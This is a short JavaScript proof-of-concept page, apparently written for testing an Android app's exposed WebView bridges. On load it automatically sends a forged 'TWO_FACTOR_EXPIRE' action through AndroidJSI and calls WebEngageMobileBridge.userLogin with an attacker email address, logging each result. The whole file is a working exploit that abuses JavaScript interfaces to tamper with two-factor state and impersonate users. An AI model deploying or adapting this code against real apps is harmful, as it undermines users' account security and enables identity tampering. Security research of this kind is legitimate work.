function log(msg) {
  document.getElementById("output").textContent += msg + "\n";
}

function tryExploit() {
  const payload = {
    action: "TWO_FACTOR_EXPIRE",  // or a valid action like "getToken" from your app
    data: {}
  };

  try {
    log("Sending payload...");
    AndroidJSI.onReceiveMessage(JSON.stringify(payload));
  } catch (e) {
    log("AndroidJSI failed: " + e);
  }

  // Optional: WebEngage bridge test
  try {
    log("Trying WebEngage...");
    if (typeof WebEngageMobileBridge !== 'undefined') {
      WebEngageMobileBridge.userLogin("attacker@example.com");
      log("WebEngage userLogin sent.");
    } else {
      log("WebEngageMobileBridge not found");
    }
  } catch (e) {
    log("WebEngage error: " + e);
  }
}

window.onload = tryExploit;
